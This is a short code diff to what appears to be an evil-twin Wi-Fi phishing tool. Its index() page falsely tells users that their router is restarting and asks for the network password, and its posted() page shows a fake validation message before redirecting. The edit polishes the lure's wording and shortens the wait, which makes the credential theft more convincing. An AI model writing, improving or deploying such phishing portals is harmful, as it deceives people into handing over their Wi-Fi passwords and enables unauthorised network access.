@@ -71,7 +71,7 @@ String index()
 {
   String pass_field = header("Sign In");
         pass_field += "<div>";
-        pass_field += "Due to internal problems router is being restarted. Enter password to re-connect to the network.";
+        pass_field += "Due to internal problems, the router is being restarted.<br>Please enter your password to re-connect to the network.";
         pass_field += "</div>";
         pass_field += "<div>";
         pass_field += "<form action='/'>";
@@ -87,7 +87,7 @@ String index()
 
 String posted()
 {
- return header("Validating")+"Your account is being validated. Please, wait up to 2 minute for device connection.</br>Thank you."+"<script>setTimeout(function(){window.location.href = '/result';},15000);</script></div><div class=q><center>&#169; All rights reserved.</center></div>";
+ return header("Validating")+"Your account is being validated.<br>Please wait up to 2 minutes for device connection.</br>Thank you."+"<script>setTimeout(function(){window.location.href = '/result';},3000);</script></div><div class=q><center>&#169; All rights reserved.</center></div>";
 }
 
 void performScan()
